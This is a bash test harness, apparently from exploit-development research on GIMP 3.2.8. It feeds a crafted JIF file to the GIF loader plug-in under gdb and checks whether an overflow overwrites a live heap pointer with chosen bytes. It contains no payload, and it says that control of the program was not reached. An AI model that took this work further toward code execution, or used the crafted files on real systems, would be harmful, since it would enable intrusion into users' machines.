#!/usr/bin/env bash
# W312: measure, in the real GIMP 3.2.8 file-gif-load plug-in under a no-shim
# AppRun, whether the file-chosen overflow replaces the live pointer word at
# indexes+280 (W252 shim-named object: flags=1 at +272, heap pointer at +280).
# A hardware watchpoint observes the stores; nothing is patched.
#
# Asserted: wrapped inflate reached, a live heap pointer present before the
# write, chosen 0x4d bytes stored into both words from real libz, safe control
# clean. NOT asserted: chosen-address write, dereference, control flow,
# marker or command. Grade remains rung 3 / rung 4 PARTIAL.
set -euo pipefail

HERE="$(cd "$(dirname "$0")" && pwd)"
BASE="$(cd "$HERE/.." && pwd)"
WORK="${GIMPJIF_APPIMAGE_WORK:-/tmp/gimpjif-appimage}"
IMG="$WORK/GIMP-3.2.8-x86_64.AppImage"
ROOT="$WORK/squashfs-root"
EVID="$HERE/evidence"
PASS=0
FAIL=0

ok () { echo "PASS: $1"; PASS=$((PASS + 1)); }
no () { echo "FAIL: $1"; FAIL=$((FAIL + 1)); }

mkdir -p "$WORK" "$EVID"
if [ ! -f "$IMG" ] || [ ! -f "$WORK/SHA256SUMS" ]; then
  echo "provision the SHA256-verified GIMP 3.2.8 AppImage first (see run-appimage-span.sh)" >&2
  exit 1
fi
(cd "$WORK" && grep 'GIMP-3.2.8-x86_64.AppImage' SHA256SUMS | sha256sum -c -)
ok "official AppImage SHA256 verified"

if [ ! -x "$ROOT/AppRun" ]; then
  chmod +x "$IMG"
  (cd "$WORK" && ./GIMP-3.2.8-x86_64.AppImage --appimage-extract >/dev/null)
fi
"$ROOT/AppRun" --version | grep -q '3.2.8'
ok "extracted runtime reports GIMP 3.2.8"

# Regenerate a no-shim AppRun every replay: earlier probes may have left an
# LD_PRELOAD export in the extracted AppRun.
target="$ROOT/AppRun.liveptr"
: > "$target"
while IFS= read -r line || [ -n "$line" ]; do
  case "$line" in
    *gimpjif2shell/live/*shim.so*) continue ;;
  esac
  printf '%s\n' "$line" >> "$target"
done < "$ROOT/AppRun"
chmod +x "$target"
! grep -q 'gimpjif2shell/live/.*shim.so' "$target"
ok "no-shim AppRun variant generated"

python3 "$BASE/realglib/make-jif.py" "$EVID/gdb-liveptr-8192.jif" published-run 8192 4d > /dev/null
ok "8 KiB chosen-run JIF written"

run_case () {
  local file="$1" out="$2"
  local home; home="$(mktemp -d /tmp/gimpjif-liveptrhome-XXXXXX)"
  (cd "$ROOT" && exec setsid timeout -k 5 90 env HOME="$home" \
      GIMP_PLUGIN_DEBUG_WRAP=file-gif-load,run \
      GIMP_PLUGIN_DEBUG_WRAPPER="gdb -q -batch -x $HERE/gdb-liveptr.cmd --args" \
      ./AppRun.liveptr -i --batch-interpreter plug-in-script-fu-eval \
      -b "(let* ((img (car (gimp-file-load RUN-NONINTERACTIVE \"$file\" \"$(basename "$file")\")))) (gimp-message (number->string (car (gimp-image-get-width img)))))" \
      -b '(gimp-quit 0)') > "$out" 2>&1 &
  local runpid=$!
  wait "$runpid" || true
  # Children outlive the main AppRun; kill only this run's session.
  kill -9 -- "-$runpid" 2>/dev/null || true
}

SAFE="$BASE/realglib/evidence/safe.jif"
run_case "$SAFE" "$EVID/gdb-liveptr-safe.log"
run_case "$EVID/gdb-liveptr-8192.jif" "$EVID/gdb-liveptr-8192.log"

grep -q 'batch command executed successfully' "$EVID/gdb-liveptr-safe.log" \
  && ok "safe 4x4 JIF loads under the live-pointer debugger" || no "safe live-pointer control"
! grep -q 'W312 WATCH HIT' "$EVID/gdb-liveptr-safe.log" \
  && ok "safe JIF raises no live-pointer watch hit" || no "safe live-pointer watch hit"

grep -q 'W312 PRE-INFLATE indexes=' "$EVID/gdb-liveptr-8192.log" \
  && ok "wrapped inflate reached in the live plug-in" || no "wrapped inflate call"
grep -qE 'W312 LIVE FIELDS flags=0x1 ptr=0x0000' "$EVID/gdb-liveptr-8192.log" \
  && ok "live object pointer present before the write" || no "live pointer field"
grep -q 'W312 WATCH SET flags' "$EVID/gdb-liveptr-8192.log" \
  && ok "watch set on live flags word" || no "flags watch install"
grep -q 'W312 WATCH SET liveptr' "$EVID/gdb-liveptr-8192.log" \
  && ok "watch set on live pointer word" || no "liveptr watch install"
grep -q 'W312 WATCH HIT liveptr' "$EVID/gdb-liveptr-8192.log" \
  && ok "chosen-byte store into the live pointer word" || no "liveptr store"
grep -q 'W312 WATCH HIT liveptr.*value=0x4d4d4d4d4d4d4d4d' "$EVID/gdb-liveptr-8192.log" \
  && ok "live pointer word fully replaced by chosen 0x4d bytes" || no "chosen pointer value"
grep -q 'libz.so.1' "$EVID/gdb-liveptr-8192.log" \
  && ok "store comes from the real libz" || no "real libz frame"
grep -q ' in ReadJeffsImage ' "$EVID/gdb-liveptr-8192.log" \
  && ok "store backtrace reaches ReadJeffsImage" || no "ReadJeffsImage frame"
grep -q 'is_jeff_image=1' "$EVID/gdb-liveptr-8192.log" \
  && ok "JIF branch is on the live backtrace" || no "JIF branch frame"
grep -qE 'W312 PLUGIN SIGNAL (SIGSEGV|SIGABRT|SIGBUS)' "$EVID/gdb-liveptr-8192.log" \
  && ok "corrupt allocator metadata faults the live plug-in" || no "live fault"

echo "CEILING: chosen bytes replace a live pointer word; no chosen address, dereference, marker or command."
echo "TOTAL: $PASS PASS / $FAIL FAIL"
[ "$FAIL" -eq 0 ]
